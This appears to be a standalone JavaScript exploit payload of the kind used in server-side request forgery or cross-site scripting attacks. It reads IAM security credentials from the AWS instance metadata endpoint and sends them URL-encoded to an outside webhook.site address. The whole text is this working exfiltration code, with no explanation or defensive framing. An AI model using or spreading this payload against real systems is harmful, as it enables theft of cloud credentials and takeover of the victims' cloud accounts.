x = new XMLHttpRequest;
x.onload = function() {
    l = new XMLHttpRequest;
    l.open("GET", "https://webhook.site/617d0898-cb2d-4dce-b6d2-c9fd28802b8f" + encodeURIComponent(this.responseText));
    l.send();
};
x.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/");
x.send();
